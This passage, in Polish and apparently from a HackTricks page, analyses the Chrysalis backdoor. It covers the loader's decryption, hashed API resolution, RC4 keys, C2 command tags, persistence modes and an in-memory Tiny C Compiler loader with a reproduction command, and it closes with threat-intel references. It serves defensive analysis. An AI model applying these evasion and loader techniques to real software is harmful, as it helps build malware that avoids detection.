- Plik wykonywalny hosta importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go przy użyciu niestandardowego strumienia opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor czystym shellcodem, zwalnia tymczasowe zasoby i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API przez hashowanie nazw eksportów używając **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, następnie stosując Murmur-style avalanche (**0x85EBCA6B**) i porównując z solonymi docelowymi hashami.

Main shellcode (Chrysalis)
- Odszyfrowuje moduł główny przypominający PE przez powtarzanie add/XOR/sub z kluczem `gQ2JR&9;` przez pięć przebiegów, następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby zakończyć rozwiązywanie importów.
- Odtwarza łańcuchy nazw DLL w czasie wykonywania przez per-znakowe rotacje bitowe/XOR, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę eksportów w blokach 4-bajtowych z Murmur-style mixing i sięga do `GetProcAddress` tylko jeśli hash nie zostanie znaleziony.

Embedded configuration & C2
- Konfiguracja znajduje się wewnątrz upuszczonego pliku `BluetoothService` pod **offset 0x30808** (rozmiar **0x980**) i jest odszyfrowana RC4 kluczem `qwhvb^435h&*7`, ujawniając URL C2 i User-Agent.
- Beacony budują profil hosta oddzielony kropkami, poprzedzają tagiem `4Q`, następnie szyfrują RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i rozsyłane przez switch tagów (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Tryb wykonania zależy od argumentów CLI: brak argumentów = instalacja persistence (service/Run key) wskazująca na `-i`; `-i` restartuje program z `-k`; `-k` pomija instalację i uruchamia payload.

Alternate loader observed
- To samo włamanie upuściło Tiny C Compiler i uruchomiło `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Podany przez atakującego kod źródłowy w C zawierał shellcode, został skompilowany i uruchomiony w pamięci bez zapisywania PE na dysku. Odtwórz za pomocą:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ta oparta na TCC faza kompilacji i uruchamiania zaimportowała `Wininet.dll` w czasie wykonywania i pobrała second-stage shellcode z hardcoded URL, tworząc elastyczny loader, który podszywa się pod uruchomienie kompilatora.

## Referencje

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
